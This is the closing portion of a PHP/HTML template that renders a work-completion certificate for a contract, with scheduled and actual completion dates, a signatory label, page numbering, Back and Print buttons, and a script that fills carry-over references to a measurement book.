			<td width="35"></td>
			<td width="65"></td>
			<td width="65"></td>
			<td width="65"></td>
			<td width="65"></td>
			<td width="32"></td>	 
	  	</tr>
      	<tr>
			<td></td>
			<td colspan="2">Schedule date of completion: <?php echo dt_display($sdoc); ?></td>
			<td></td>
			<td></td>
			<td></td>
			<td></td>
			<td></td>
			<td></td>	 
	  	</tr>
	  	<tr>
	     	<td></td>
		 	<td colspan="8">
				&emsp;Certified that the work has been physically completed on <?php echo dt_display($adoc); ?>, 
				with in the date due according to the contract i.e <?php echo dt_display($sdoc); ?> 
				and that no defects are apparent and the contractor has removed from 
				the permises on which the work was being executed. All the surolus 
				materials are removed from the site upon or about which the work was to 
				ba executed or of which he had possession for the purpose of execution thereof, 
				this is however, subject to the measurements being recorded and quality being by the competent Authority. 
			</td>
		</tr>
		<tr>
			 <td>&nbsp;</td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>	 
	  	</tr>
	  	<tr>
			 <td>&nbsp;</td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>	 
	  	</tr>
	  	<tr>
			 <td>&nbsp;</td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>	 
	  	</tr>
	  	<tr>
			 <td>&nbsp;</td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td></td>
			 <td align="center" class="label labelbold" colspan="2">ACE, FRFCF</td>
			 <td></td>
			 <td></td>	 
	  	</tr>
	</table>
<?php
}
echo '<table width="875" style="border-style:none;" cellpadding="1" cellspacing="1" align="center" bgcolor="#FFFFFF" class="label">';
echo '<tr style="border-style:none;">
		<td style="border-style:none;" colspan="9" align="right">&nbsp;&nbsp</td>
		</tr>';
echo '<tr style="border-style:none;">
		<td style="border-style:none;" width="53%" align="right">&nbsp;Page '.$page.'&nbsp;&nbsp</td>
		<td style="border-style:none;" colspan="4" align="right">&nbsp;&nbsp</td>
		</tr>';
echo '</table>';
?>
<input type="hidden" name="txt_boxid_str" id="txt_boxid_str" value="<?php echo rtrim($summary_b,","); ?>"  />
<div align="center" class="btn_outside_sect printbutton">
	<div class="btn_inside_sect"><input type="button" class="backbutton" name="Back" value=" Back " onclick="goBack();"/> </div>
	<div class="btn_inside_sect"><input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" /></div>
	<!--<div class="btn_inside_sect">
		<a href="exportexcel.php?workno=<?php echo $sheetid;?>" style="text-decoration:none">
			<input type="button" class="backbutton" name="export_excel" value="Excel" />
		</a>
	</div>-->
</div>
<!--<table border="0" width="875" style="border-style:none" align="center" bgcolor="#000000" class='labelcontent printbutton'>
	<tr border="0" style="border-style:none">
		<td border="0" style="border-style:none">&nbsp;
		</td>
		<td border="0" style="border-style:none">&nbsp;
		</td>
		<td border="0" style="border-style:none">&nbsp;
		</td>
	</tr>
	<tr border="0" style="border-style:none" height="35px;">
		<td border="0" style="border-style:none" align="right">
			<input type="submit" name="Back" value=" Back " /> 
		</td>
		<td border="0" style="border-style:none" width="20px">&nbsp;
		</td>
		<td border="0" style="border-style:none" align="left">
			<input type="button" class="backbutton" name="print" value=" Print " /> 
		</td>
	</tr>
</table>  -->
</div>
<style>

</style>
    </body>
	 <script type="text/javascript">
   $(function(){ 
   var getstr = document.getElementById("txt_boxid_str").value;
   var splitval = getstr.split(","); //alert(splitval.length);
   var x=0;
   for(x=0;x<splitval.length;x+=3)
   {
   		document.getElementById("txt_page"+splitval[x]).value = "C/o to page "+splitval[x+1]+"/General MB No. "+"<?php echo $mbookno; ?>"; 
   }
   });
   </script>
</html>